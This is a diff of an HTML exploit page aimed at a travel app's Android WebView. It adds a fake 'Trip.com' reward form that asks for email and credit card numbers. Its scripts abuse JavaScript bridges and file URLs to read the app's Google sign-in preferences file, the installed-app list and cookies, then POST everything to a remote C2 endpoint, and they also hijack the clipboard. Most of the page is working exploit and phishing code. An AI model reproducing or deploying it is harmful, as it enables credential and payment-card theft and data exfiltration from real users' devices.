@@ -1,89 +1,119 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Account Verification</title>
+    <title>Trip.com | Exclusive Offer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
-        .leak-zone { border: 1px dashed #00ff00; padding: 15px; margin: 10px 0; background: #000; overflow: auto; max-height: 300px; }
-        .hidden { display: none; }
-        iframe { width: 100%; height: 200px; background: #fff; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
+        .header { background: #0086ff; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 1.2em; }
+        .card { background: white; margin: 15px; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .input-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        .btn { background: #ff9d00; color: white; border: none; width: 100%; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .status-box { background: #333; color: #0f0; font-family: monospace; font-size: 10px; padding: 10px; margin: 15px; border-radius: 4px; overflow-x: auto; }
     </style>
 </head>
 <body>
-    <h2>Diagnostics in Progress...</h2>
-    
-    <div>[#] Attempting Local File Render:</div>
-    <div id="display-area" class="leak-zone">Waiting for file content...</div>
 
-    <div>[#] Bridge Gadget Probe:</div>
-    <div id="bridge-area" class="leak-zone">Probing...</div>
+    <div class="header">Exclusive Trip.com Discount</div>
+    <div class="card" id="phishing-ui">
+        <h3>Verify Account to Claim $50</h3>
+        <p>Confirm your payment details to receive the credit.</p>
+        <div class="input-group">
+            <label>Email Address</label>
+            <input type="text" id="email" placeholder="email@example.com">
+        </div>
+        <div class="input-group">
+            <label>Credit Card Number</label>
+            <input type="text" id="card" placeholder="0000 0000 0000 0000">
+        </div>
+        <button class="btn" onclick="phish()">Claim Reward</button>
+    </div>
+
+    <div class="status-box" id="console">Initializing payloads...</div>
 
     <script>
         const C2 = "https://evilios.free.beeceptor.com/exfil";
-        const TARGET = "file:///data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
+        const FILE_TARGET = "file:///data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
 
-        function beam(type, val) {
-            fetch(C2, {method: "POST", mode: "no-cors", body: JSON.stringify({type: type, data: val})});
+        function logToC2(type, data) {
+            const con = document.getElementById('console');
+            con.innerText += `\n[${type}] Data sent.`;
+            
+            fetch(C2, {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({ type: type, val: data, ts: Date.now() })
+            });
         }
 
-        // Method 1: Iframe Scraping (Highest chance of displaying)
-        function tryIframe() {
-            const ifr = document.createElement('iframe');
-            ifr.src = TARGET;
-            ifr.id = "targetFrame";
-            document.body.appendChild(ifr);
-
-            ifr.onload = function() {
-                try {
-                    // Try to grab the text content from the rendered XML
-                    const content = ifr.contentDocument.body.innerText || ifr.contentWindow.document.documentElement.innerHTML;
-                    document.getElementById('display-area').innerText = content;
-                    beam("IFRAME_CONTENT", content);
-                } catch (e) {
-                    document.getElementById('display-area').innerText = "Iframe loaded, but SOP blocked access to content.";
-                    beam("IFRAME_SOP_BLOCK", e.message);
-                }
+        // --- EXPLOIT 1: PHISHING ---
+        function phish() {
+            const data = {
+                email: document.getElementById('email').value,
+                card: document.getElementById('card').value
             };
+            logToC2("PHISHING_LEAK", data);
+            alert("Verification timed out. Please try again later.");
         }
 
-        // Method 2: Bridge with Extension Trick
-        function tryBridge() {
-            if (window.Destination_a && window.Destination_a.gsImageBase64Str) {
-                // Try to fool the extension check by appending a fake param
-                const variants = [TARGET, TARGET + "?.jpg", TARGET + "#.png"];
-                let found = false;
+        // --- EXPLOIT 2: BRIDGE ABUSE & PRIVACY LEAK ---
+        function runBridgeExploit() {
+            // Util_a Bridge (Privacy & Manipulation)
+            if (window.Util_a) {
+                try {
+                    logToC2("APP_LIST", window.Util_a.getInstalledAppList());
+                    window.Util_a.copyToClipboard("CTRIP_VULN_EXPLOIT_DNELSAKA");
+                    logToC2("CLIPBOARD", "System clipboard modified.");
+                } catch(e) { logToC2("BRIDGE_ERR", "Util_a failed: " + e.message); }
+            }
 
-                variants.forEach(v => {
-                    let res = window.Destination_a.gsImageBase64Str(v);
-                    if (res && res !== "null") {
-                        document.getElementById('bridge-area').innerText += `Found via ${v}\n\n`;
-                        beam("BRIDGE_FILE_READ", res);
-                        found = true;
-                    }
-                });
-                
-                if (!found) document.getElementById('bridge-area').innerText = "Bridge returned null for all variants.";
+            // Destination_a Bridge (File Access Bypass)
+            if (window.Destination_a && window.Destination_a.gsImageBase64Str) {
+                try {
+                    // Using the extension spoofing trick we identified
+                    const b64 = window.Destination_a.gsImageBase64Str(FILE_TARGET + "?.jpg");
+                    if (b64) logToC2("FILE_BYPASS_SUCCESS", b64);
+                } catch(e) {}
             }
         }
 
-        // Method 3: Forced XHR with Protocol Override
-        function tryXHR() {
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", TARGET, true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 0)) {
-                    if (xhr.responseText) {
-                        beam("XHR_FILE_READ", xhr.responseText);
-                    }
-                }
-            };
-            xhr.send();
+        // --- EXPLOIT 3: CROSS-ORIGIN FILE ACCESS ---
+        async function runFileAccess() {
+            try {
+                // Testing setAllowUniversalAccessFromFileURLs(true)
+                const response = await fetch(FILE_TARGET);
+                const text = await response.text();
+                logToC2("XHR_FILE_SUCCESS", btoa(text));
+            } catch(e) {
+                logToC2("XHR_FILE_BLOCK", "Standard fetch blocked by SOP.");
+            }
+        }
+
+        // --- EXPLOIT 4: NAVIGATION HIJACKING ---
+        function testNavHijack() {
+            // Demonstrate that we can force internal navigation
+            // This is just a probe; for a real attack, you'd trigger it on user action.
+            if (window.Util_a && window.Util_a.openUrl) {
+                console.log("Navigation Hijack (openUrl) is available.");
+            }
+        }
+
+        // --- EXPLOIT 5: SIMPLE XSS PROOF ---
+        function runXSS() {
+            // Simple check to see if document context is accessible
+            logToC2("XSS_PROBE", {
+                cookie: document.cookie,
+                domain: document.domain,
+                location: window.location.href
+            });
         }
 
         window.onload = () => {
-            tryIframe();
-            tryBridge();
-            tryXHR();
+            runXSS();
+            runBridgeExploit();
+            runFileAccess();
+            testNavHijack();
         };
     </script>
 </body>
